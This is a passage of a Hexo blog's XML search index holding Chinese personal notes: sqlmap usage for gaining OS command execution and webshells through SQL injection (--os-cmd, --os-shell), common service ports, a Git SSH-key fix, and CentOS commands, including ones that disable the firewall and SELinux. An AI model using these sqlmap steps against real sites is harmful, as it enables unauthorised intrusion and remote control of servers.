文件名必须是绝对路径 用户必须有写文件权限 sqlmap写shell前提需要对目录具有写权限 1--os-cmd=&quot;net user&quot; 交互式命令执行，注意在使用交互式方式时需知道网站的绝对路径，执行成功后在绝对路径下创建文件返回结果，然后再自动删除。 1--os-shell 写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell 关闭sqlmap文件就会被删除 常见数据库端口号123456789101112131415Oracle 默认1521SQL Server 默认1433Mysql默认330621 FTP 22 ssh23 telnet25 smtp109 110 pop2 pop3]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo日志]]></title>
    <url>%2Fnote%2F2019%2Fundefined02%2F1c91193.html</url>
    <content type="text"><![CDATA[2019.6.1Git 远程遇到了问题: Please make sure you have the correct access rights and the repository exists. 发现是ssh key有问题，连接不上服务器 首先是重新在git设置一下身份的名字和邮箱： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;your@email.com&quot; 注：要添加具体的yourname，your@email 删除.ssh文件夹（直接搜索该文件夹）下的known_hosts 在 git输入命令： $ ssh-keygen -t rsa -C &quot;your@email.com&quot; 然后会出现： Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa): 回车后系统自动在 .ssh 文件夹下生成两个文件，id_rsa和id_rsa.pub，用记事本打开id_rsa.pub，把全部内容复制 登陆GitHub 账户，进入设置中的“SSH and GPG keys”新建 SSH keys 在 Key中把刚刚复制的粘贴进去，点击 add ssh key 在 git 中输入命令 ssh -T git@github.com 然后输入Yes回车，就会提示成功 之后就可以正常 hexo d -g 啦]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 笔记]]></title>
    <url>%2Fnote%2F2019%2Fundefined25%2F875db5e1.html</url>
    <content type="text"><![CDATA[CentOS 常用命令 shutdown -h now 关机 shutdown -h +3 三分钟后关机 halt poweroff init 0 shutdown -r now 重启 shutdown -r +3 三分钟重启 reboot init 6 cat 1.txt | tail - n +3001 | head -n 1000 截取文件中的3001到4000 grep o 1.txt 正常过滤 grep -v 1.txt 反向过滤 cat &gt;1.txt 清空文件内容 ll -d /data/www 查看权限 pkill -kill -t tty3 杀死用户进程 mkdir /media/cdrom mount /dev/sr0 /media/cdrom 挂载光盘 umount /media/cdrom 卸载 systemctl stop firewalld.service 关闭防火墙 setenforce 0 给外界权限 systemctl disable firewalld.service 永久关闭 systemctl enable firewalld.service 永久开启 vim /etc/rc.d/rc.local 设置开机启动为镜像添加开机自动挂载 echo &quot;mount /dev/sr0 /media/cdrom&quot; &gt;&gt; /etc/rc.d/rc.local vim /etc/selinux/config ^vim^cat 把vim替换成cat继续执行 ls -al 看临时文件 CentOS7 目录文件 /etc/yum.repos.d/ yum源文件位置 /etc/rc.d/rc.local 开机启动文件 rm -f /var/run/yum.pid yum clean all 清空yum源缓存 /etc/nginx/conf.d/default.conf Nginx配置文件 vim /etc/my.cnf 去mysql密码要求 /usr/share/nginx/html/ Nginx主页文件位置 /etc/httpd/conf/httpd.conf Apache配置文件 /var/www/html/ Apache主页文件位置]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Who am I]]></title>
    <url>%2Fnote%2F2019%2Fundefined21%2Fe3eaa03c.html</url>
    <content type="text"><![CDATA[未来可期]]></content>
      <tags>
        <tag>Me</tag>
      </tags>
  </entry>
</search>
